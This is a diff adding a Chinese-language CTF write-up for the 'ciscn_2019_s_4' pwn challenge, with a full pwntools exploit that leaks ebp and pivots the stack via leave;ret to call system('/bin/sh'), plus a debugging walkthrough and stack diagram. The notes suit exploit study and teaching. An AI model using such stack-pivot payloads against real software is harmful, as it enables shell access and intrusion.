@@ -345,3 +345,61 @@ __int64 vulnerable()
 
 
 所以只需要nc之后输入`exec 1>&0`就可以了
+
+## 54 ciscn_2019_s_4
+
+***栈迁移***
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',26010)
+#gdb.attach(p)
+
+leave_ret = 0x08048562
+sys = elf.sym['system']
+
+payload = b'a'*0x24+b'b'*0x4
+p.sendafter('name?\n',payload)
+p.recvuntil(b'bbbb')
+
+leak_addr = u32(p.recv(4))	#	ebp的地址泄露出来
+log.info("leak_addr:"+hex(leak_addr))
+buf = leak_addr-0x38	# 回到栈顶
+
+payload2 = p32(sys)+p32(0)+p32(buf+0xc)+b'/bin/sh\x00'	# 
+payload2 = payload2.ljust(0x28,b'a')+p32(buf-4)+p32(leave_ret)
+
+p.send(payload2)
+p.interactive()
+```
+
+### 动态调试分析
+
+- 先看下新栈的地址为什么是`ebp-0x38`
+  - ![image-20250210000514934](./images/image-20250210000514934.png)
+  - 这里是寄存器的地址，可以看到我们的字符串输入到了`760`处、而`ebp`指向了`798`处，相差`0x3`8字节，所以将栈迁移到这里，方便执行我们的输入
+
+- ==payload2 = (p32(sys)+p32(0)+p32(buf+0xc)+b'/bin/sh\x00').ljust(0x28,b'a')+p32(buf-4)+p32(leave_ret)==
+
+  - `p32(buf-4)`:将ebp覆盖为了`buf-4`,因为每执行一条指令之后eip会自动+4，这里将eip退回去，防止跳过指令
+
+  - `p32(leave_ret)`：将返回地址覆盖为leave
+
+    > 此时的栈结构
+    >
+    > | buf            |                   |
+    > | -------------- | ----------------- |
+    > | sys_addr       | system函数地址    |
+    > | 0              | 返回地址（占位）  |
+    > | buf+12         | /bin/sh的参数地址 |
+    > | /bin/sh        |                   |
+    > | 填充的剩余空间 |                   |
+    > | buf-4          | 栈迁移后的ebp     |
+    > | leave          | 执行leave_ret     |
